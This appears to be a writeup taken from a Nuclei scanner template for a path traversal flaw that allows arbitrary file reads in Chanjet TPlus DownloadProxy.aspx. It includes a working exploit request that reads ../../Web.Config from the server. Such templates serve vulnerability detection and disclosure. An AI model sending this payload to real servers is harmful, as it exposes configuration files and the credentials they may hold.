# Nuclei Template: Chanjet TPlus DownloadProxy.aspx - Arbitrary File Read
**Template ID:** chanjet-tplus-file-read
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`chanjet-tplus-file-read.yaml`)

## Vulnerability Information & PoC

## Description
Chanjet TPlus DownloadProxy.aspx file has an arbitrary file reading vulnerability. An attacker can obtain sensitive files on the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT%2B%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
